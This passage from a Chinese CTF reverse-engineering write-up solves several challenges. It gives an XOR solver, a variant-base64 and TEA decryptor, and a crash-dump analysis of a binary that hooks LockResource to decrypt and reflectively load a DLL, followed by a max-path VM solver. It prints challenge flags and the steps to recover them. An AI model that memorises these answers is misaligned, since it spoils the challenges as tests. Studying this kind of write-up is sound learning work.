class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(s_ops, op):</span><br><span class="line">        print(<span class="built_in">chr</span>(i^<span class="built_in">ord</span>(j)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    get_first()</span><br><span class="line">    get_second()</span><br><span class="line">    <span class="comment"># flag&#123;welcome_2_A2m_WoRLD!&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="easy-app"><a href="#easy-app" class="headerlink" title="easy-app"></a>easy-app</h3><p>主要加密逻辑在.so中，实际上就是变型base64+TEA算法</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="built_in">string</span> base64_chars = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz!@#$%^&amp;*()ABCDEFGHIJKLMNOPQRSTUVWXYZ+/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">is_base64</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (base64_chars[i] != c &amp;&amp; i &lt; <span class="number">64</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    i++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> i &lt; <span class="number">64</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">base64_decode</span><span class="params">(<span class="built_in">string</span> <span class="keyword">const</span> &amp;encoded_string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> in_len = encoded_string.size();</span><br><span class="line">  <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> in_ = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> char_array_4[<span class="number">4</span>], char_array_3[<span class="number">3</span>];</span><br><span class="line">  <span class="built_in">string</span> ret;</span><br><span class="line">  <span class="keyword">while</span> (in_len-- &amp;&amp; (encoded_string[in_] != <span class="string">&#x27;=&#x27;</span>) &amp;&amp; is_base64(encoded_string[in_]))</span><br><span class="line">  &#123;</span><br><span class="line">    char_array_4[i++] = encoded_string[in_];</span><br><span class="line">    in_++;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">        char_array_4[i] = base64_chars.find(char_array_4[i]);</span><br><span class="line">      char_array_3[<span class="number">0</span>] = (char_array_4[<span class="number">2</span>] &lt;&lt; <span class="number">2</span>) + ((char_array_4[<span class="number">0</span>] &amp; <span class="number">0x30</span>) &gt;&gt; <span class="number">4</span>);</span><br><span class="line">      char_array_3[<span class="number">1</span>] = ((char_array_4[<span class="number">0</span>] &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">4</span>) + ((char_array_4[<span class="number">1</span>] &amp; <span class="number">0x3c</span>) &gt;&gt; <span class="number">2</span>);</span><br><span class="line">      char_array_3[<span class="number">2</span>] = ((char_array_4[<span class="number">1</span>] &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">6</span>) + char_array_4[<span class="number">3</span>];</span><br><span class="line">      <span class="keyword">for</span> (i = <span class="number">0</span>; (i &lt; <span class="number">3</span>); i++)</span><br><span class="line">        ret += char_array_3[i];</span><br><span class="line">      i = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (i)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (j = i; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">      char_array_4[j] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">      char_array_4[j] = base64_chars.find(char_array_4[j]);</span><br><span class="line">    char_array_3[<span class="number">0</span>] = (char_array_4[<span class="number">2</span>] &lt;&lt; <span class="number">2</span>) + ((char_array_4[<span class="number">0</span>] &amp; <span class="number">0x30</span>) &gt;&gt; <span class="number">4</span>);</span><br><span class="line">    char_array_3[<span class="number">1</span>] = ((char_array_4[<span class="number">0</span>] &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">4</span>) + ((char_array_4[<span class="number">1</span>] &amp; <span class="number">0x3c</span>) &gt;&gt; <span class="number">2</span>);</span><br><span class="line">    char_array_3[<span class="number">2</span>] = ((char_array_4[<span class="number">1</span>] &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">6</span>) + char_array_4[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; (j &lt; i - <span class="number">1</span>); j++)</span><br><span class="line">      ret += char_array_3[j];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *v, <span class="keyword">unsigned</span> <span class="keyword">int</span> *k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0xC6EF3720</span>, i;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>];</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br><span class="line">    v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1);</span><br><span class="line">    sum -= delta;</span><br><span class="line">  &#125;</span><br><span class="line">  v[<span class="number">0</span>] = v0;</span><br><span class="line">  v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">string</span> check1 = base64_decode(<span class="string">&quot;e)n*pNe%PQy!^oS(@HtkUu+Cd$#hmmK&amp;ieytiWwYkIA=&quot;</span>);</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v[<span class="number">2</span>] = &#123;<span class="number">0</span>, <span class="number">0</span>&#125;, k[<span class="number">4</span>] = &#123;<span class="number">66</span>, <span class="number">55</span>, <span class="number">44</span>, <span class="number">33</span>&#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; check1.size(); i += <span class="number">8</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> *v = (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)&amp;check1[i];</span><br><span class="line">    <span class="comment">// printf(&quot;%x %x\n&quot;, v[0], v[1]);</span></span><br><span class="line">    decrypt(v, k);</span><br><span class="line">    <span class="comment">// printf(&quot;%x %x\n&quot;, v[0], v[1]);</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">string</span> str1 = check1.substr(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">  <span class="built_in">string</span> str2 = check1.substr(<span class="number">16</span>, <span class="number">16</span>);</span><br><span class="line">  <span class="built_in">string</span> temp1 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="built_in">string</span> temp2 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; str1.size() &amp;&amp; i &lt; str2.size(); i++)</span><br><span class="line">  &#123;</span><br><span class="line">    temp1 += (str1[i] &amp; <span class="number">0xf</span>) | (str2[i] &amp; <span class="number">0xf0</span>);</span><br><span class="line">    temp2 += (str2[i] &amp; <span class="number">0xf</span>) | (str1[i] &amp; <span class="number">0xf0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;flag&#123;&quot;</span> &lt;&lt; temp1 + temp2 &lt;&lt; <span class="string">&quot;&#125;&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="climb"><a href="#climb" class="headerlink" title="climb"></a>climb</h3><p>一个小插曲：题目本身虽然是计划出成dump的形式，但是并不是如今的样子。现在的dump实际上是<strong>出题人不小心写出来的bug形成的dump</strong>。不过好像作为一个dump题还挺真实的，所以就直接拿来出题了（  </p>
<p>首先看到dump文件，发现是一个访问出错，并且发现访问的地址是一个不可写的地址，但是程序本身却是尝试与其进行异或:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">00007ff7&#96;aefe1080 4883ec28        sub     rsp,28h</span><br><span class="line">00007ff7&#96;aefe1084 ff158e860000    call    qword ptr [ClimbToTop!pfnLockResource (00007ff7&#96;aefe9718)]</span><br><span class="line">00007ff7&#96;aefe108a 4c8b057f860000  mov     r8,qword ptr [ClimbToTop!g_Size (00007ff7&#96;aefe9710)]</span><br><span class="line">00007ff7&#96;aefe1091 33c9            xor     ecx,ecx</span><br><span class="line">00007ff7&#96;aefe1093 4c8bc8          mov     r9,rax</span><br><span class="line">00007ff7&#96;aefe1096 498d4001        lea     rax,[r8+1]</span><br><span class="line">00007ff7&#96;aefe109a 4883f840        cmp     rax,40h</span><br><span class="line">00007ff7&#96;aefe109e 726b            jb      ClimbToTop!NewLockResource+0x8b (00007ff7&#96;aefe110b)</span><br><span class="line">00007ff7&#96;aefe10a0 660f6f1598640000 movdqa  xmm2,xmmword ptr [ClimbToTop!_xmm (00007ff7&#96;aefe7540)]</span><br><span class="line">00007ff7&#96;aefe10a8 498d5110        lea     rdx,[r9+10h]</span><br><span class="line">00007ff7&#96;aefe10ac 83e03f          and     eax,3Fh</span><br><span class="line">00007ff7&#96;aefe10af 4d8bd0          mov     r10,r8</span><br><span class="line">00007ff7&#96;aefe10b2 4c2bd0          sub     r10,rax</span><br><span class="line">00007ff7&#96;aefe10b5 6666660f1f840000000000 nop word ptr [rax+rax]</span><br><span class="line">00007ff7&#96;aefe10c0 f30f6f42f0      movdqu  xmm0,xmmword ptr [rdx-10h]</span><br><span class="line">00007ff7&#96;aefe10c5 83c140          add     ecx,40h</span><br><span class="line">00007ff7&#96;aefe10c8 488d5240        lea     rdx,[rdx+40h]</span><br><span class="line">00007ff7&#96;aefe10cc 4863c1          movsxd  rax,ecx</span><br><span class="line">00007ff7&#96;aefe10cf 660fefc2        pxor    xmm0,xmm2</span><br><span class="line">00007ff7&#96;aefe10d3 f30f7f42b0      movdqu  xmmword ptr [rdx-50h],xmm0</span><br><span class="line">00007ff7&#96;aefe10d8 f30f6f4ac0      movdqu  xmm1,xmmword ptr [rdx-40h]</span><br><span class="line">00007ff7&#96;aefe10dd 660fefca        pxor    xmm1,xmm2</span><br></pre></td></tr></table></figure>
<p>在这边能够找到<code>pfnLockResource</code>，当前函数名字又叫做<code>ClimbToTop!NewLockResource</code>，可以猜测当前的可能正在发生hook。在调用链上，还能看到类似<code>AttachDetour</code>和<code>DetachDetour</code>的函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">00007ff7&#96;aefe120e 488bc8          mov     rcx,rax</span><br><span class="line">00007ff7&#96;aefe1211 e8aa2a0000      call    ClimbToTop!DetourUpdateThread (00007ff7&#96;aefe3cc0)</span><br><span class="line">00007ff7&#96;aefe1216 488d1563feffff  lea     rdx,[ClimbToTop!NewLockResource (00007ff7&#96;aefe1080)]</span><br><span class="line">00007ff7&#96;aefe121d 488d0df4840000  lea     rcx,[ClimbToTop!pfnLockResource (00007ff7&#96;aefe9718)]</span><br><span class="line">00007ff7&#96;aefe1224 e8571b0000      call    ClimbToTop!DetourAttach (00007ff7&#96;aefe2d80)</span><br><span class="line">00007ff7&#96;aefe1229 e8e2250000      call    ClimbToTop!DetourTransactionCommit (00007ff7&#96;aefe3810)</span><br><span class="line">00007ff7&#96;aefe122e 488bcf          mov     rcx,rdi</span><br><span class="line">00007ff7&#96;aefe1231 ff15e95d0000    call    qword ptr [ClimbToTop!_imp_LockResource (00007ff7&#96;aefe7020)]</span><br><span class="line">00007ff7&#96;aefe1237 488bf8          mov     rdi,rax</span><br><span class="line">00007ff7&#96;aefe123a e861250000      call    ClimbToTop!DetourTransactionBegin (00007ff7&#96;aefe37a0)</span><br><span class="line">00007ff7&#96;aefe123f ff15d35d0000    call    qword ptr [ClimbToTop!_imp_GetCurrentThread (00007ff7&#96;aefe7018)]</span><br><span class="line">00007ff7&#96;aefe1245 488bc8          mov     rcx,rax</span><br><span class="line">00007ff7&#96;aefe1248 e8732a0000      call    ClimbToTop!DetourUpdateThread (00007ff7&#96;aefe3cc0)</span><br><span class="line">00007ff7&#96;aefe124d 488d152cfeffff  lea     rdx,[ClimbToTop!NewLockResource (00007ff7&#96;aefe1080)]</span><br><span class="line">00007ff7&#96;aefe1254 488d0dbd840000  lea     rcx,[ClimbToTop!pfnLockResource (00007ff7&#96;aefe9718)]</span><br><span class="line">00007ff7&#96;aefe125b e8a0210000      call    ClimbToTop!DetourDetach (00007ff7&#96;aefe3400)</span><br></pre></td></tr></table></figure>
<p>结合题目基本上可以断定，整个进程<strong>hook了API LockResource</strong>。然后看到之后之后还有一些LoadRemoteLibrary之类的库，并且将当前load的资源穿了过去，所以可以联想到<strong>dll本身会从exe的资源段释放</strong>。这个exe 去hook了<code>LockResource</code>，说明其<strong>企图修改LockResource的调用逻辑</strong>。从逻辑中看到只是一个简单的异或。最后看到上下文可以明白本质上是<strong>从资源段释放一个dll，并且通过hook LockResource 偷偷解密了资源，并且最后load到内存中</strong>。实际上load的部分是一个反射dll注入，不过不影响做题，直接从内存中将这一段逻辑dump下来，然后按照解密逻辑倒推即可。</p>
<h3 id="DLL内部逻辑"><a href="#DLL内部逻辑" class="headerlink" title="DLL内部逻辑"></a>DLL内部逻辑</h3><p>首先可以发现整个逻辑会读入长度为192的01串，然后会尝试调用一个虚拟机。虚拟机看起来很大，但是实际上真正用到的汇编没几个。</p>
<p>可以确定的opcode在这边</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000180005038 opcode          db 81h, 34h, 8 dup(0), 31h, 4 dup(0), 32h, 1, 3 dup(0)</span><br><span class="line">.data:0000000180005038                                         ; DATA XREF: sub_180001000+F↑w</span><br><span class="line">.data:0000000180005038                                         ; sub_180001000+54↑w ...</span><br><span class="line">.data:0000000180005038                 db 33h, 0C2h, 3 dup(0), 50h, 7, 0C2h, 3 dup(0), 82h, 83h</span><br><span class="line">.data:0000000180005038                 db 8, 8 dup(0), 34h, 8 dup(0), 5, 1, 3 dup(0), 40h, 1</span><br><span class="line">.data:0000000180005038                 db 0C0h, 3 dup(0), 51h</span><br></pre></td></tr></table></figure>
<p>vm整体不是很长，并且有动态给字节码赋值的操作，大致逆向之后可以写出如下的逻辑:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">r0 = global_array[<span class="number">0</span>]</span><br><span class="line">g_sum = r0</span><br><span class="line">r1 = <span class="number">0</span></span><br><span class="line">r2 = <span class="number">1</span></span><br><span class="line">r3 = <span class="number">194</span></span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">    r0 = Dst[r1]</span><br><span class="line">    <span class="keyword">if</span>(r0 != <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        r2 = r2+<span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    r0 = ans[r2+r3]</span><br><span class="line">    r0 = g_sum + r0</span><br><span class="line">    g_sum = r0</span><br><span class="line">    r1 += <span class="number">1</span></span><br><span class="line">&#125;<span class="keyword">while</span>(r1 &lt;<span class="number">192</span>)</span><br></pre></td></tr></table></figure>
<p><code>global_array</code>的生成方式为</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">if</span> ( v3 &gt;= <span class="number">1</span> )</span><br><span class="line">     &#123;</span><br><span class="line">       global_array_line = global_array_;</span><br><span class="line">       v5 = v3;</span><br><span class="line">       <span class="keyword">do</span></span><br><span class="line">       &#123;</span><br><span class="line">         ++global_array_line;</span><br><span class="line">         *(global_array_line - <span class="number">1</span>) = rand() % <span class="number">0xFFF</span>;</span><br><span class="line">         --v5;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">while</span> ( v5 );</span><br><span class="line">     &#125;</span><br><span class="line">     ++v3;</span><br><span class="line">     global_array_ += <span class="number">194</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p><code>global_array</code>其中的值是固定值，并且其实按照类似<strong>三角形</strong>的形式再往其中填充数据（第一层只有一个数据，第二层有两个，以此类推）<br>根据题目描述可知，可能是一个求极值问题，根据输入的01决定选择三角形的哪条边。不过这边要求的是最大值而不是最小值，大约就是一个算法问题，可以写出解题思路:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Ws2tcpip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEPTH 193</span></span><br><span class="line"><span class="keyword">int</span> dwTotal = <span class="number">18528</span>;</span><br><span class="line"><span class="keyword">int</span> TrEE[DEPTH][DEPTH];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build_tree</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; DEPTH; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		sum += i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; DEPTH; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= i; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			TrEE[i][j] = rand() % <span class="number">0xfff</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">walk_tree</span><span class="params">(<span class="keyword">char</span>* input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> size = <span class="built_in">strlen</span>(input);</span><br><span class="line">	<span class="keyword">int</span> retValue = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &gt; <span class="number">192</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Error input [X]&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> x = <span class="number">0</span> , y = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> first_step = TrEE[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">	sum += first_step;</span><br><span class="line">	y = <span class="number">1</span>;</span><br><span class="line">	x = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">char</span> ch = input[i];</span><br><span class="line">		x += <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">switch</span> (ch)&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">//right</span></span><br><span class="line">				sum += TrEE[x][++y];</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">//left</span></span><br><span class="line">				sum += TrEE[x][y];</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a[<span class="number">193</span>][<span class="number">193</span>];</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> TrEEPath[<span class="number">193</span>][<span class="number">193</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">find_large_path</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; DEPTH; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; DEPTH; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			a[i][j] = TrEE[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> n, i, j = <span class="number">0</span>;</span><br><span class="line">	n = <span class="number">193</span>;</span><br><span class="line">	<span class="keyword">auto</span> max = [](<span class="keyword">int</span> a, <span class="keyword">int</span> b) &#123;</span><br><span class="line">		<span 